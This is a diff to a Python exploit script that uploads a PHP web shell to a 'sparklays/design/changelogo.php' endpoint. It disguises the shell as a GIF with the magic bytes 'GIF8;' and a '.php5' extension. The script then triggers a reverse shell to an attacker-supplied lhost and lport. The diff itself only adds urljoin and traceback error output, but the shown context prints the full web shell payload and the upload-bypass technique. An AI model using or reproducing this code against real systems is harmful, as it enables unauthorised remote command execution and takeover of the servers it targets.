@@ -1,13 +1,14 @@
 import requests
 import argparse
-import sys
+from urllib.parse import urljoin
+import traceback
 
 def upload_shell(target_url):
     """
     Uploads the web shell to the target.
     Returns True if successful, False otherwise.
     """
-    upload_url = target_url + "/sparklays/design/changelogo.php"
+    upload_url = urljoin(target_url, "/sparklays/design/changelogo.php")
     shell_code = b"GIF8;\n<?php system($_REQUEST['shell']); ?>"
     files = {
         "file": ("shell.php5", shell_code, "image/gif")
@@ -28,6 +29,7 @@ def upload_shell(target_url):
             print("[-] Upload failed: unexpected response.")
     except Exception as e:
         print("[-] Upload request failed:", e)
+        traceback.print_exc()
     return False
 
 def trigger_shell(target_url, lhost, lport):
@@ -47,9 +49,9 @@ def trigger_shell(target_url, lhost, lport):
     print("[*] Payload sent. Check your listener.")
     try:
         requests.post(shell_url, data=payload, headers=headers)
-        print("[*] Payload sent. Check your listener.")
     except Exception as e:
         print("[-] Failed to send payload:", e)
+        traceback.print_exc()
 
 def main():
     parser = argparse.ArgumentParser(description="Upload PHP reverse shell and trigger it.")
